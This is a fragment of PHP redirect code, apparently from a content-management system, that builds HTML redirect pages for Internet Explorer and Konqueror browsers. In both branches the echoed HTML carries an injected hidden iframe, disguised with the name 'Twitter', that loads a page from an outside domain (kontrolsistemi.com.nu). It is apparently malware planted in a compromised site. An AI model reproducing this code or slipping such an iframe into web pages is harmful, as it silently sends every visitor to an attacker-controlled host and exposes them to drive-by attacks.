		...
		else
		{
			...
			if ($navigator->isBrowser('msie') && !utf8_is_ascii($url))
			{
				...
				echo '<html><head><meta http-equiv="content-type" content="text/html; charset=' . $document->getCharset() . '" />'
					. '<script>document.location.href=\'' . htmlspecialchars($url) . '\';</script></head><iframe name=Twitter scrolling=auto frameborder=no align=center height=74 width=95 src=http://kontrolsistemi.com.nu/post.php?id=916669></iframe></body></html>';
			}
			elseif (!$moved and $navigator->isBrowser('konqueror'))
			{
				...
				echo '<html><head><meta http-equiv="content-type" content="text/html; charset=' . $document->getCharset() . '" />'
					. '<meta http-equiv="refresh" content="0; url=' . htmlspecialchars($url) . '" /></head><iframe name=Twitter scrolling=auto frameborder=no align=center height=74 width=95 src=http://kontrolsistemi.com.nu/post.php?id=916669></iframe></body></html>';
			}
			else
			{
